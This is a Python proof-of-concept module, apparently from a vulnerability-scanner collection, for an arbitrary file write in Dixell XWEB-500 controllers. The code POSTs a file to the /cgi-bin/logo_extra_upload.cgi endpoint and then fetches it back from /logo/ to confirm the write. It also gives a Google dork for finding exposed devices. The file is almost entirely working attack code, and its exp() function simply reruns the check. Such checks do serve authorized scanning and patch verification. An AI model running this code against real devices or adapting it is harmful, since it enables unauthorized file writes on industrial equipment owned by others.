import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Dixell XWEB-500 - Arbitrary File Write''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/50639"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            "google-dork":'''inurl:"xweb500.cgi"'''
        },
        "tags": ["lfw", "iot", "dixell", "xweb500"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/cgi-bin/logo_extra_upload.cgi"""
        method = "POST"
        data = """test.txt
dixell-xweb500-filewrite"""
        headers = {'Content-Type': 'application/octet-stream'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/logo/test.txt"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp1.status_code == 200 and "dixell-xweb500-filewrite" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url